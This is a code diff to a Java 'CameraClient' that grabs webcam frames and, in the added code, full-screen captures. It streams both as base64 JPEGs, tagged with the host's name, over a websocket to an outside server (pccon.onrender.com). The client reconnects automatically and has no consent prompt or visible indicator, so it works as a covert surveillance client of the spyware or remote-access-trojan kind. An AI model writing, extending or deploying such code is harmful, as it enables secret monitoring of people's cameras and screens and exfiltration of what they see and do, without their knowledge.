@@ -1,9 +1,13 @@
+import java.awt.AWTException;
+import java.awt.Rectangle;
+import java.awt.Robot;
+import java.awt.Toolkit;
+import java.awt.image.BufferedImage;
 import java.io.ByteArrayOutputStream;
 import java.net.InetAddress;
 import java.net.URI;
 import java.util.Base64;
 import java.util.concurrent.Executors;
-import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.TimeUnit;
 
 import javax.imageio.ImageIO;
@@ -17,7 +21,8 @@ import org.java_websocket.handshake.ServerHandshake;
 public class CameraClient {
 
     static final String SERVER_URL    = "wss://pccon.onrender.com";
-    static final int    FPS           = 10;
+    static final int    CAM_FPS       = 30;
+    static final int    SCREEN_FPS    = 10; // screen is heavier, keep lower
     static final int    RECONNECT_SEC = 5;
 
     static volatile CameraWebSocket ws;
@@ -29,19 +34,27 @@ public class CameraClient {
     public static void main(String[] args) throws Exception {
         pcId = InetAddress.getLocalHost().getHostName();
 
-        // Try to open camera 0
-        try {
-            grabber = new OpenCVFrameGrabber(0);
-            grabber.start();
-            hasCamera = true;
-            System.out.println("[*] PC: " + pcId + " | Camera: true");
-        } catch (Exception e) {
-            hasCamera = false;
-            System.out.println("[*] PC: " + pcId + " | Camera: false (" + e.getMessage() + ")");
+        for (int idx = 0; idx < 3; idx++) {
+            try {
+                grabber = new OpenCVFrameGrabber(idx);
+                grabber.setImageWidth(640);
+                grabber.setImageHeight(480);
+                grabber.start();
+                Frame test = grabber.grab();
+                if (test != null && test.image != null) {
+                    hasCamera = true;
+                    System.out.println("[*] Camera: true (index " + idx + ")");
+                    break;
+                }
+                grabber.stop();
+            } catch (Exception e) {
+                System.out.println("[*] Camera index " + idx + " failed: " + e.getMessage());
+            }
         }
+        if (!hasCamera) System.out.println("[*] Camera: false");
 
-        if (hasCamera) startFrameLoop();
-
+        if (hasCamera) startCameraLoop();
+        startScreenLoop();
         connectAndRun();
 
         Runtime.getRuntime().addShutdownHook(new Thread(() -> {
@@ -52,30 +65,62 @@ public class CameraClient {
         Thread.currentThread().join();
     }
 
-    static void startFrameLoop() {
-        long intervalMs = 1000L / FPS;
+    static void startCameraLoop() {
+        long intervalMs = 1000L / CAM_FPS;
         Java2DFrameConverter converter = new Java2DFrameConverter();
-        final int[] sent = {0};
 
         Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(() -> {
             try {
                 if (ws == null || !ws.isOpen()) return;
                 Frame frame = grabber.grab();
                 if (frame == null || frame.image == null) return;
-                java.awt.image.BufferedImage img = converter.convert(frame);
+                BufferedImage img = converter.convert(frame);
                 if (img == null) return;
-                ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                ImageIO.write(img, "jpg", baos);
-                byte[] bytes = baos.toByteArray();
-                if (bytes.length == 0) return;
-                String b64 = Base64.getEncoder().encodeToString(bytes);
+                String b64 = toBase64(img);
+                if (b64 == null) return;
                 ws.send("{\"type\":\"frame\",\"id\":\"" + pcId + "\",\"frame\":\"" + b64 + "\"}");
-                sent[0]++;
-                if (sent[0] % 50 == 0) System.out.println("[*] Frames sent: " + sent[0]);
             } catch (Exception e) {
-                System.err.println("[!] Frame error: " + e.getMessage());
+                System.err.println("[!] Camera error: " + e.getMessage());
             }
         }, 0, intervalMs, TimeUnit.MILLISECONDS);
+    }
+
+    static void startScreenLoop() {
+        Robot robot;
+        try {
+            robot = new Robot();
+        } catch (AWTException e) {
+            System.err.println("[!] Screen capture unavailable: " + e.getMessage());
+            return;
+        }
+        Rectangle screen = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
+        long intervalMs = 1000L / SCREEN_FPS;
+
+        Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(() -> {
+            try {
+                if (ws == null || !ws.isOpen()) return;
+                BufferedImage img = robot.createScreenCapture(screen);
+                // scale down to reduce bandwidth
+                java.awt.image.BufferedImage scaled = new java.awt.image.BufferedImage(1280, 720, BufferedImage.TYPE_INT_RGB);
+                scaled.getGraphics().drawImage(img.getScaledInstance(1280, 720, java.awt.Image.SCALE_FAST), 0, 0, null);
+                String b64 = toBase64(scaled);
+                if (b64 == null) return;
+                ws.send("{\"type\":\"screen_frame\",\"id\":\"" + pcId + "\",\"frame\":\"" + b64 + "\"}");
+            } catch (Exception e) {
+                System.err.println("[!] Screen error: " + e.getMessage());
+            }
+        }, 0, intervalMs, TimeUnit.MILLISECONDS);
+
+        System.out.println("[*] Screen capture started");
+    }
+
+    static String toBase64(BufferedImage img) {
+        try {
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            ImageIO.write(img, "jpg", baos);
+            byte[] bytes = baos.toByteArray();
+            return bytes.length == 0 ? null : Base64.getEncoder().encodeToString(bytes);
+        } catch (Exception e) { return null; }
     }
 
     static void connectAndRun() {
@@ -84,7 +129,7 @@ public class CameraClient {
             ws.connectBlocking();
             if (!ws.isOpen()) { scheduleReconnect(); return; }
             System.out.println("[+] Connected.");
-            ws.send("{\"type\":\"hello\",\"id\":\"" + pcId + "\",\"hasCamera\":" + hasCamera + "}");
+            ws.send("{\"type\":\"hello\",\"id\":\"" + pcId + "\",\"hasCamera\":" + hasCamera + ",\"hasScreen\":true}");
         } catch (Exception e) {
             System.err.println("[!] Connection error: " + e.getMessage());
             scheduleReconnect();
